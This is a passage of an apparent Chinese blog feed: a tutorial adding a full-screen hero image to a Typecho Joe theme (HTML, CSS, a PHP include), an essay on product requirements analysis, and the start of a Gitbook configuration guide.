&lt;/div&gt;</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line">    &lt;/#if&gt;</span><br><span class="line">    &lt;#if settings.footer_source==&#x27;both&#x27;  settings.footer_source==&#x27;backend&#x27;&gt;</span><br><span class="line">      &lt;@global.footer /&gt;</span><br><span class="line">    &lt;/#if&gt;--&gt;</span><br><span class="line">  &lt;/footer&gt;</span><br><span class="line">&lt;/#if&gt;</span><br></pre></td></tr></table></figure><h2 id="添加全屏头图显示"><a href="#添加全屏头图显示" class="headerlink" title="添加全屏头图显示"></a>添加全屏头图显示</h2><h3 id="创建HTML文件"><a href="#创建HTML文件" class="headerlink" title="创建HTML文件"></a>创建HTML文件</h3><p>内容如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">        &lt;section class=&quot;bg-hero py-md-0&quot; style=&quot;background-image: url(https://cos.gjcloak.xyz/yun/%E5%9B%BE%E7%89%87/6171_2131898046.jpg?imageMogr2/format/webp/interlace/1/quality/80)&quot;&gt;</span><br><span class="line">            &lt;div class=&quot;container&quot;&gt;</span><br><span class="line">                &lt;div class=&quot;row vh-md-100&quot;&gt;</span><br><span class="line">                    &lt;div class=&quot;col-md-8 mx-auto my-auto text-white text-center&quot;&gt;</span><br><span class="line">                         &lt;p class=&quot;lead mb-2 font-weight-bold&quot;&gt;&lt;br&gt;&lt;/p&gt;</span><br><span class="line">                        &lt;h1 class=&quot;my-4&quot;&gt;&lt;big&gt;Hi, I&#x27;m Cloak.&lt;/big&gt;&lt;/h1&gt;</span><br><span class="line">                        &lt;p class=&quot;lead mb-5 font-weight-bold&quot;&gt;</span><br><span class="line">                            &lt;span class=&quot;typist&quot;&gt;公 爵 书 房&lt;/span&gt;</span><br><span class="line">                        &lt;/p&gt;</span><br><span class="line">                    &lt;/div&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">        &lt;/section&gt;</span><br><span class="line">        &lt;script src=&quot;https://code.jquery.com/jquery-3.2.1.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><h3 id="使用字体（可选）"><a href="#使用字体（可选）" class="headerlink" title="使用字体（可选）"></a>使用字体（可选）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;link rel=&quot;stylesheet&quot; href=&quot;https://fonts.googleapis.com/css?family=PacificoInconsolata:400,700&quot;&gt;</span><br></pre></td></tr></table></figure><h3 id="添加CSS"><a href="#添加CSS" class="headerlink" title="添加CSS"></a>添加CSS</h3><p>在前面创建的HTML文件里加入一下CSS代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br></pre></td><td class="code"><pre><span class="line">.bg-hero &#123;</span><br><span class="line">  background-color: #3d5afe;</span><br><span class="line">  background-size: cover;</span><br><span class="line">  background-position: center center;</span><br><span class="line">  position: relative; &#125;</span><br><span class="line">  .bg-hero:before &#123;</span><br><span class="line">    position: absolute;</span><br><span class="line">    z-index: 1;</span><br><span class="line">    width: 100%;</span><br><span class="line">    height: 100%;</span><br><span class="line">    display: block;</span><br><span class="line">    left: 0;</span><br><span class="line">    top: 0;</span><br><span class="line">    content: &quot;&quot;;</span><br><span class="line">    background-color: rgba(0, 0, 0, 0.3); &#125;</span><br><span class="line">  .bg-hero .container &#123;</span><br><span class="line">    z-index: 2;</span><br><span class="line">    position: relative; &#125;</span><br><span class="line">    .bg-hero .container h1 &#123;</span><br><span class="line">      font-family: Pacifico;</span><br><span class="line">      font-weight: normal;</span><br><span class="line">      color: #ffffff; &#125;</span><br><span class="line">      </span><br><span class="line">.py-md-0 &#123;</span><br><span class="line">    padding-top: 0 !important; &#125;</span><br><span class="line">    </span><br><span class="line">.py-md-0 &#123;</span><br><span class="line">    padding-bottom: 0 !important; &#125;</span><br><span class="line">    </span><br><span class="line">.container &#123;</span><br><span class="line">  width: 100%;</span><br><span class="line">  padding-right: 15px;</span><br><span class="line">  padding-left: 15px;</span><br><span class="line">  margin-right: auto;</span><br><span class="line">  margin-left: auto; &#125;</span><br><span class="line">  @media (min-width: 576px) &#123;</span><br><span class="line">    .container &#123;</span><br><span class="line">      max-width: 540px; &#125; &#125;</span><br><span class="line">  @media (min-width: 768px) &#123;</span><br><span class="line">    .container &#123;</span><br><span class="line">      max-width: 720px; &#125; &#125;</span><br><span class="line">  @media (min-width: 992px) &#123;</span><br><span class="line">    .container &#123;</span><br><span class="line">      max-width: 960px; &#125; &#125;</span><br><span class="line">  @media (min-width: 1200px) &#123;</span><br><span class="line">    .container &#123;</span><br><span class="line">      max-width: 1140px; &#125; &#125;</span><br><span class="line"></span><br><span class="line">.container-fluid &#123;</span><br><span class="line">  width: 100%;</span><br><span class="line">  padding-right: 15px;</span><br><span class="line">  padding-left: 15px;</span><br><span class="line">  margin-right: auto;</span><br><span class="line">  margin-left: auto; &#125;</span><br><span class="line">  </span><br><span class="line">  .navbar &gt; .container,</span><br><span class="line">  .navbar &gt; .container-fluid &#123;</span><br><span class="line">    display: -ms-flexbox;</span><br><span class="line">    display: flex;</span><br><span class="line">    -ms-flex-wrap: wrap;</span><br><span class="line">        flex-wrap: wrap;</span><br><span class="line">    -ms-flex-align: center;</span><br><span class="line">        align-items: center;</span><br><span class="line">    -ms-flex-pack: justify;</span><br><span class="line">        justify-content: space-between; &#125;</span><br><span class="line">        </span><br><span class="line">@media (max-width: 575.99px) &#123;</span><br><span class="line">  .navbar-expand-sm &gt; .container,</span><br><span class="line">  .navbar-expand-sm &gt; .container-fluid &#123;</span><br><span class="line">    padding-right: 0;</span><br><span class="line">    padding-left: 0; &#125; &#125;</span><br><span class="line">    </span><br><span class="line">@media (min-width: 576px) &#123;</span><br><span class="line">  .navbar-expand-sm &gt; .container,</span><br><span class="line">    .navbar-expand-sm &gt; .container-fluid &#123;</span><br><span class="line">      -ms-flex-wrap: nowrap;</span><br><span class="line">          flex-wrap: nowrap; &#125;&#125;</span><br><span class="line">          </span><br><span class="line">@media (max-width: 767.99px) &#123;</span><br><span class="line">  .navbar-expand-md &gt; .container,</span><br><span class="line">  .navbar-expand-md &gt; .container-fluid &#123;</span><br><span class="line">    padding-right: 0;</span><br><span class="line">    padding-left: 0; &#125; &#125;</span><br><span class="line">    </span><br><span class="line">@media (min-width: 768px) &#123;</span><br><span class="line">  .navbar-expand-md &gt; .container,</span><br><span class="line">    .navbar-expand-md &gt; .container-fluid &#123;</span><br><span class="line">      -ms-flex-wrap: nowrap;</span><br><span class="line">          flex-wrap: nowrap; &#125;&#125;</span><br><span class="line"></span><br><span class="line">@media (max-width: 991.99px) &#123;</span><br><span class="line">  .navbar-expand-lg &gt; .container,</span><br><span class="line">  .navbar-expand-lg &gt; .container-fluid &#123;</span><br><span class="line">    padding-right: 0;</span><br><span class="line">    padding-left: 0; &#125; &#125;</span><br><span class="line">    </span><br><span class="line">@media (min-width: 992px) &#123;</span><br><span class="line">  .navbar-expand-lg &gt; .container,</span><br><span class="line">    .navbar-expand-lg &gt; .container-fluid &#123;</span><br><span class="line">      -ms-flex-wrap: nowrap;</span><br><span class="line">          flex-wrap: nowrap; &#125;&#125;</span><br><span class="line"></span><br><span class="line">@media (max-width: 1199.99px) &#123;</span><br><span class="line">  .navbar-expand-xl &gt; .container,</span><br><span class="line">  .navbar-expand-xl &gt; .container-fluid &#123;</span><br><span class="line">    padding-right: 0;</span><br><span class="line">    padding-left: 0; &#125; &#125;</span><br><span class="line">    </span><br><span class="line">@media (min-width: 1200px) &#123;</span><br><span class="line">    .navbar-expand-xl &gt; .container,</span><br><span class="line">    .navbar-expand-xl &gt; .container-fluid &#123;</span><br><span class="line">      -ms-flex-wrap: nowrap;</span><br><span class="line">          flex-wrap: nowrap; &#125; &#125;</span><br><span class="line"></span><br><span class="line"> .navbar-expand &gt; .container,</span><br><span class="line">  .navbar-expand &gt; .container-fluid &#123;</span><br><span class="line">    padding-right: 0;</span><br><span class="line">    padding-left: 0; &#125;</span><br><span class="line">    </span><br><span class="line"> .navbar-expand &gt; .container,</span><br><span class="line">  .navbar-expand &gt; .container-fluid &#123;</span><br><span class="line">    -ms-flex-wrap: nowrap;</span><br><span class="line">        flex-wrap: nowrap; &#125;</span><br><span class="line">        </span><br><span class="line">.row &#123;</span><br><span class="line">  display: -ms-flexbox;</span><br><span class="line">  display: flex;</span><br><span class="line">  -ms-flex-wrap: wrap;</span><br><span class="line">      flex-wrap: wrap;</span><br><span class="line">  margin-right: -15px;</span><br><span class="line">  margin-left: -15px; &#125;</span><br><span class="line">  </span><br><span class="line">@media (min-width: 768px) &#123;</span><br><span class="line">  .vh-md-100 &#123;</span><br><span class="line">    height: 100vh; &#125; &#125;</span><br><span class="line">    </span><br><span class="line">.col-1, .col-2, .col-3, .col-4, .col-5, .col-6, .col-7, .col-8, .col-9, .col-10, .col-11, .col-12, .col,</span><br><span class="line">.col-auto, .col-sm-1, .col-sm-2, .col-sm-3, .col-sm-4, .col-sm-5, .col-sm-6, .col-sm-7, .col-sm-8, .col-sm-9, .col-sm-10, .col-sm-11, .col-sm-12, .col-sm,</span><br><span class="line">.col-sm-auto, .col-md-1, .col-md-2, .col-md-3, .col-md-4, .col-md-5, .col-md-6, .col-md-7, .col-md-8, .col-md-9, .col-md-10, .col-md-11, .col-md-12, .col-md,</span><br><span class="line">.col-md-auto, .col-lg-1, .col-lg-2, .col-lg-3, .col-lg-4, .col-lg-5, .col-lg-6, .col-lg-7, .col-lg-8, .col-lg-9, .col-lg-10, .col-lg-11, .col-lg-12, .col-lg,</span><br><span class="line">.col-lg-auto, .col-xl-1, .col-xl-2, .col-xl-3, .col-xl-4, .col-xl-5, .col-xl-6, .col-xl-7, .col-xl-8, .col-xl-9, .col-xl-10, .col-xl-11, .col-xl-12, .col-xl,</span><br><span class="line">.col-xl-auto &#123;</span><br><span class="line">  position: relative;</span><br><span class="line">  width: 100%;</span><br><span class="line">  min-height: 1px;</span><br><span class="line">  padding-right: 15px;</span><br><span class="line">  padding-left: 15px; &#125;</span><br><span class="line">  </span><br><span class="line">@media (min-width: 768px) &#123;</span><br><span class="line">  .col-md &#123;</span><br><span class="line">    -ms-flex-preferred-size: 0;</span><br><span class="line">        flex-basis: 0;</span><br><span class="line">    -ms-flex-positive: 1;</span><br><span class="line">        flex-grow: 1;</span><br><span class="line">    max-width: 100%; &#125;</span><br><span class="line">  .col-md-auto &#123;</span><br><span class="line">    -ms-flex: 0 0 auto;</span><br><span class="line">        flex: 0 0 auto;</span><br><span class="line">    width: auto;</span><br><span class="line">    max-width: none; &#125;</span><br><span class="line">  .col-md-8 &#123;</span><br><span class="line">    -ms-flex: 0 0 66.66667%;</span><br><span class="line">        flex: 0 0 66.66667%;</span><br><span class="line">    max-width: 66.66667%; &#125;&#125;</span><br><span class="line"></span><br><span class="line">.mx-auto &#123;</span><br><span class="line">  margin-left: auto !important; </span><br><span class="line">  margin-right: auto !important; &#125;</span><br><span class="line"></span><br><span class="line">.my-auto &#123;</span><br><span class="line">  margin-top: auto !important; </span><br><span class="line">  margin-bottom: auto !important; &#125;</span><br><span class="line"></span><br><span class="line">.text-white &#123;</span><br><span class="line">  color: #fff !important; &#125;</span><br><span class="line"> </span><br><span class="line">.text-center &#123;</span><br><span class="line">  text-align: center !important; &#125;</span><br><span class="line">  </span><br><span class="line">.img-fluid &#123;</span><br><span class="line">  max-width: 100%;</span><br><span class="line">  height: auto; &#125;</span><br><span class="line">  </span><br><span class="line">.rounded-circle &#123;</span><br><span class="line">  border-radius: 50% !important; &#125;</span><br><span class="line">  </span><br><span class="line">.img-profile &#123;</span><br><span class="line">  max-width: 175px; &#125;</span><br><span class="line">  </span><br><span class="line">.lead &#123;</span><br><span class="line">  font-size: 1.2rem;</span><br><span class="line">  font-weight: 400; &#125;</span><br><span class="line">  </span><br><span class="line">.mb-5,</span><br><span class="line">.my-5 &#123;</span><br><span class="line">  margin-bottom: 1.5rem !important; &#125;</span><br><span class="line"></span><br><span class="line">.mb-6,</span><br><span class="line">.my-6 &#123;</span><br><span class="line">  margin-bottom: 1.8rem !important; &#125;</span><br><span class="line">  </span><br><span class="line">.font-weight-bold &#123;</span><br><span class="line">  font-weight: 700 !important; &#125;</span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">/* Typist */</span><br><span class="line">@keyframes blink &#123;</span><br><span class="line">  0% &#123;</span><br><span class="line">    opacity: 1.0; &#125;</span><br><span class="line">  50% &#123;</span><br><span class="line">    opacity: 0.0; &#125;</span><br><span class="line">  100% &#123;</span><br><span class="line">    opacity: 1.0; &#125; &#125;</span><br><span class="line"></span><br><span class="line">@-webkit-keyframes blink &#123;</span><br><span class="line">  0% &#123;</span><br><span class="line">    opacity: 1.0; &#125;</span><br><span class="line">  50% &#123;</span><br><span class="line">    opacity: 0.0; &#125;</span><br><span class="line">  100% &#123;</span><br><span class="line">    opacity: 1.0; &#125; &#125;</span><br><span class="line"></span><br><span class="line">.typist .selectedText &#123;</span><br><span class="line">  display: none; &#125;</span><br><span class="line"></span><br><span class="line">.typist:after &#123;</span><br><span class="line">  position: relative;</span><br><span class="line">  top: 7px;</span><br><span class="line">  display: inline-block;</span><br><span class="line">  height: 30px;</span><br><span class="line">  margin-left: 5px;</span><br><span class="line">  content: &quot; &quot;;</span><br><span class="line">  -webkit-animation: blink .5s step-end infinite alternate;</span><br><span class="line">  animation: blink .5s step-end infinite alternate;</span><br><span class="line">  border-right: 2px solid; &#125;</span><br></pre></td></tr></table></figure><h3 id="主题使用"><a href="#主题使用" class="headerlink" title="主题使用"></a>主题使用</h3><p>在主题的<code>index.php</code>文件中，查找到<code>&lt;?php $this-&gt;need(&#39;public/header.php&#39;); ?&gt;</code>这串代码，在下方引入下面代码（当然具体位置可以根据需要自动调整）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php        </span><br><span class="line">    include (&quot;public/[file name].html&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><code>[file name]</code> 是前面创建的html文件名称<br>最后，这样就完成了全屏头图显示。</p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> typecho魔改 </tag>
            
            <tag> joe </tag>
            
            <tag> 美化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何做好需求分析</title>
      <link href="/81.html"/>
      <url>/81.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>在设计一个产品的时候，我们首先要透过现象看本质，明白我们是要为谁，解决什么问题？分析的结果，将会直接影响到方案的好坏。那么要如何做好需求分析呢？</p></blockquote><h2 id="需求分析原则"><a href="#需求分析原则" class="headerlink" title="需求分析原则"></a>需求分析原则</h2><p>设计本质上是我们看待世界的一种思维方法，其目的是为了解决问题。在实践中，我们总要知道，我们要为谁？在什么环境或条件下，解决什么问题？如何解决？其分析的结果，直接影响到解决方案的好与坏，成或败。</p><p>司空图有言：“超以象外，得其圜中”。</p><p>意思大概是说，要「越过事物表象，得其核心要义」，即透过现象看本质。亦正如柳冠中老师在演讲中所说：“现象之外才是核心，设计真正的功夫是在设计之外。”</p><p>在实际工作中，我们能接触到的只是事物所呈现出来的表面特征，而触发这一结果的原因，或事物背后所隐藏的目的却不那么显而易见，这就需要我们从现象出发，从结果出发，一步步地分析现象，探寻现象背后的原因。</p><p>例如：用户要一个杯子，我们就要知道用户想要造杯子背后的目的、原因，是蓄水？饮水？还是送礼？</p><p><img src="https://cos.gjcloak.xyz/file/image-1652493064129.png" alt="image-1652493064129" title="image-1652493064129"></p><p>先谋事，再造物。先确定目标，再寻找路径和方法。</p><h2 id="需求分析方法"><a href="#需求分析方法" class="headerlink" title="需求分析方法"></a>需求分析方法</h2><p>那么如何得知用户在谋什么事？如何探知现象背后的原因？现象背后潜藏的目的或动机？</p><p>这就需要我们结合用户当时的处境（什么地点？什么时间？），其所扮演的角色，所表现出的行为出发，一步步探寻。</p><p>同样拿“我想要一个杯子”举例，在接到这个需求之后，应结合用户当时的处境，分析用户所处的场景、所扮演的角色，所表现出的行为，由此探知到用户需求背后的目的&#x2F;动机。</p><p><img src="https://cos.gjcloak.xyz/file/image-1652493103015.png" alt="image-1652493103015" title="image-1652493103015"></p><h3 id="角色"><a href="#角色" class="headerlink" title="角色"></a>角色</h3><p>即用户的身份、角色，可以是个体用户，也可以是一个组织团体，如学校、企业、政府部门。</p><h3 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h3><p>包含具体的时间、地点。</p><h3 id="行为"><a href="#行为" class="headerlink" title="行为"></a>行为</h3><p>即用户具体做了什么事情，比如：</p><h4 id="个体用户"><a href="#个体用户" class="headerlink" title="个体用户"></a>个体用户</h4><p>所做的事情可通过具体的行为、语言表现出来，在前期调研访谈的时候，我们要重点关注用户的行为动作，这是因为个体用户不总是言行一致，有时候其口中所说的可能跟真实情况会有偏差，这并不是用户可以说谎，而是有些时候，用户对自己可能并非十分了解。</p><h4 id="组织团体，比如企业用户"><a href="#组织团体，比如企业用户" class="headerlink" title="组织团体，比如企业用户"></a>组织团体，比如企业用户</h4><p>我们要观察的就应该是群体的行为，他们所做的事情通过具体的业务流程表现出来，为这类用户服务，我们就要与其内部的关键角色多做接触，对企业内部组织架构、业务情况有所了解。</p><p>同样拿“我想要一个杯子”举例，在接到这个需求之后，应结合用户当时的处境，分析用户所处的场景、所扮演的角色，所表现出的行为，由此探知到用户需求背后的目的&#x2F;动机。</p><h2 id="方案设计"><a href="#方案设计" class="headerlink" title="方案设计"></a>方案设计</h2><p>经过对特定的角色、场景、行为进行分析后，了解到事情的本质，有了目标，有了动机，我们再进行具体的方案设计。</p><p>在“我想要一个杯子”的案例中，基于用户目标的不同，我们的解决方案不尽相同，可以是茶壶、水塘，可以是吸管、勺子……</p><p><img src="https://cos.gjcloak.xyz/file/image-1652493240819.png" alt="image-1652493240819" title="image-1652493240819"></p><p>很多时候，我们接到一个需求之后，浪费了大量时间进行方案设计，忽略了事情背后的目的、原因，导致最终设计结果并不理想。</p><h2 id="方案评估"><a href="#方案评估" class="headerlink" title="方案评估"></a>方案评估</h2><p>前面我们发散了那么多方案，最后，要建立合适的分析维度，比如方案的新颖度，产品目标的契合度……筛选出最佳方案，评估维度太少其结果有失精准，太多则消耗时间，尽可能控制在3～5个。</p><p>但无论这个评估维度如何，方案的评估本着一个原则：投入成本要与所产生的收益成正比。</p><p>毕竟，企业不是福利院，获取商业利益才是其目的，每个老板都希望用最小的投入成本实现最大化效益。</p><p><img src="https://cos.gjcloak.xyz/file/image-1652493276773.png" alt="image-1652493276773" title="image-1652493276773"></p><h2 id="需求分析案例：我想要一匹更快的马"><a href="#需求分析案例：我想要一匹更快的马" class="headerlink" title="需求分析案例：我想要一匹更快的马"></a>需求分析案例：我想要一匹更快的马</h2><p>比如，用户会告诉我们：我想要一批更快的马。这时候，如果我们直接给用户一匹马，不见得能达到用户预期。这是因为我们忽略用户需求背后的动机，即他为什么“需要一匹更快的马”？他是要达成什么样的目标？是出于什么原因？</p><p>在不同场景下、由不同身份角色的人提出，因目标不同，解决方案亦大有不同。</p><h3 id="场景1"><a href="#场景1" class="headerlink" title="场景1"></a>场景1</h3><p>赛马场，决赛前，赛马选手：我想要一匹更快的马。</p><h4 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h4><p>赢得比赛。</p><h4 id="制约因素"><a href="#制约因素" class="headerlink" title="制约因素"></a>制约因素</h4><ul><li>比赛规则（是否可更换比赛工具）</li><li>路面情况</li><li>双方马速</li><li>双方驭马技术</li><li>双方比赛策略</li></ul><h4 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h4><ul><li>从比赛规则出发：是否可更换比赛工具，如羚羊、猎豹、汽车……</li><li>从路面情况出发：清理自己的路面，给对方跑道设置障碍……</li><li>从双方的马出发：偷走对方的好马，断对方马腿……</li><li>从双方驭马技术出发：害对方迟到，下蒙汗药……</li><li>从双方比赛策略出发：田忌赛马</li></ul><p>以上仅是思考问题的角度，在现实竞技中，我们还是要遵循相应的道德规则。</p><h4 id="经典案例"><a href="#经典案例" class="headerlink" title="经典案例"></a>经典案例</h4><p>“田忌赛马”，孙膑即是从比赛策略出发，通过：</p><ul><li>田忌：差马→对方：好马</li><li>田忌：中马→对方：差马</li><li>田忌：差马→对方：中马</li></ul><p>在双方马力对比不大的情况下，三局两胜，来帮田忌赢得比赛的。</p><p>这个方案，对时间、精力、资金的消耗都最少，效益还是很可观的，不得不佩服我们孙同学的脑袋瓜啊！</p><h3 id="场景2"><a href="#场景2" class="headerlink" title="场景2"></a>场景2</h3><p>偏远地区，通讯员：我想要一匹更快的马。</p><h4 id="目的-1"><a href="#目的-1" class="headerlink" title="目的"></a>目的</h4><p>更快地传递信息。</p><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>只要信息能过去，其目的就达到了。</p><h4 id="解决方案-1"><a href="#解决方案-1" class="headerlink" title="解决方案"></a>解决方案</h4><p>更快的传输工具，或者通讯设备：</p><ul><li>根据距离远近、地理环境等情况的情况，提供传输工具：飞鸽、风筝、弓箭、船只、汽车……</li><li>改善当地的通讯环境，提供更好的通信设备：电话、电子邮件、邮箱……</li></ul><h4 id="方案评估-1"><a href="#方案评估-1" class="headerlink" title="方案评估"></a>方案评估</h4><p>最后，经过评估，结合技术、人力投入成本与最终所产生的效益，若距离较近，我们的选择可以是弓箭……</p><h3 id="场景3"><a href="#场景3" class="headerlink" title="场景3"></a>场景3</h3><p>草原等偏远地区，普通人，日常出行：我想要一匹更快的马。</p><h4 id="目的-2"><a href="#目的-2" class="headerlink" title="目的"></a>目的</h4><p>节约出行时间。</p><h4 id="解决方案-2"><a href="#解决方案-2" class="headerlink" title="解决方案"></a>解决方案</h4><ul><li>更快的交通工具、让他人代劳</li><li>更快的交通工具，如：汽车、高铁、飞机……</li><li>他人代劳，如：仆从、外卖、物流、快递……</li></ul><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>需求分析的过程，实质上是透过现象看本质，再进行方案设计得出最佳设计方案的过程。很多时候，我们接到一个需求之后，浪费了大量时间进行方案设计，忽略了事情背后的目的、原因，导致最终设计结果并不理想。</p><p>其完整的需求分析过程如下图所示：</p><p><img src="https://cos.gjcloak.xyz/file/image-1652493568679.png" alt="image-1652493568679" title="image-1652493568679"></p>]]></content>
      
      
      <categories>
          
          <category> 知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 产品经理 </tag>
            
            <tag> 需求 </tag>
            
            <tag> 项目管理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Gitbook安装使用笔记（二）实用配置和插件</title>
      <link href="/80.html"/>
      <url>/80.html</url>
      
        <content type="html"><![CDATA[<p>介绍一下<code>gitbook</code>中<code>book.json</code>的一些实用配置和插件，详细可直接拉到底查看参考资料</p><h1 id="配置概况"><a href="#配置概况" class="headerlink" title="配置概况"></a>配置概况</h1><h2 id="全局配置"><a href="#全局配置" class="headerlink" title="全局配置"></a>全局配置</h2><h3 id="title-标题"><a href="#title-标题" class="headerlink" title="title 标题"></a>title 标题</h3><p>设置书本的标题。</p><p>在book.json中加入以下内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;title&quot; : &quot;Ruarua&quot;</span><br></pre></td></tr></table></figure><h3 id="author-作者"><a href="#author-作者" class="headerlink" title="author 作者"></a>author 作者</h3><p>作者的相关信息。</p><p>在book.json中加入以下内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;author&quot; : &quot;公爵&quot;</span><br></pre></td></tr></table></figure><h3 id="description-描述"><a href="#description-描述" class="headerlink" title="description 描述"></a>description 描述</h3><p>本书的简单描述。</p><p>在book.json中加入以下内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td 